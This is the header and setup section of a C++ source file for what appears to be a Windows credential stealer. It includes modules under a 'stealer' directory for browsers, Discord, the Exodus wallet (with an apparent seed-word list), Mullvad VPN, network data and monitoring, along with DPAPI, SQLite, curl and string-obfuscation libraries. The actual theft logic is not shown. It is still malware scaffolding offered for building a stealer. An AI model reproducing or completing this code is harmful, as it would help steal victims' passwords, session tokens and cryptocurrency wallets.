#define WIN32_LEAN_AND_MEAN               // Prevents windows.h from including winsock.h
#include <winsock2.h>                     // Must be before windows.h
#include <ws2tcpip.h>                    // for inet_ntop, etc.
#include <windows.h>                     // Now windows.h won't bring winsock.h
#include <bcrypt.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cstdint>
#include <cstring>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Wininet.h>
#include <shlobj.h>
#include <shellapi.h>                    // <-- ADD THIS
#include <sodium.h>
#include <zlib.h>
#include <set>
#include <nlohmann/json.hpp>
#include "impl/json/json.hpp"
#include <dpapi.h>
#include <filesystem>
#include <regex>
#include <stack>
#include <unordered_map>
#include <unordered_set>
#include "impl/oxorany/include.h"
#include <wlanapi.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <cctype>
#include <winsvc.h>
#include <expected>
#include <sqlite3.h>
#include <wil/resource.h>
#include <chrono>
#include <ctime>
#include <curl/curl.h>
#include <sstream>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
using json = nlohmann::json;

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "libsodium.lib")
#pragma comment(lib, "libcurl.lib")

#include "wincrypt.h"

#include <stealer/https/https.hxx>
#include <stealer/utility/utility.hxx>
#include <stealer/crypto/crypto.hxx>

#include <stealer/compilers/compiler.hxx>
auto g_compiler = std::make_shared<compiler::c_compiler>( );

#include <stealer/compilers/browsers/browsers.hxx>
#include <stealer/compilers/discord/discord.hxx>
#include <stealer/compilers/exodus/words.h>
#include <stealer/compilers/exodus/exodus.hxx>
#include <stealer/compilers/network/network.hxx>
#include <stealer/compilers/sources/sources.hxx>
#include <stealer/compilers/mullvad/mullvad.hxx>

auto g_exodus = std::make_shared<exodus::c_exodus>( );
auto g_browers = std::make_shared<browers::c_browers>( );
auto g_discord = std::make_shared<discord::c_discord>( );
auto g_mullvad = std::make_shared<mullvad::c_mullvad>( );
auto g_network = std::make_shared<network::c_network>( );
auto g_sources = std::make_shared<sources::c_sources>( );

#include <stealer/compilers/monitor/monitor.hxx>
auto g_monitor = std::make_shared<monitor::c_monitor>();
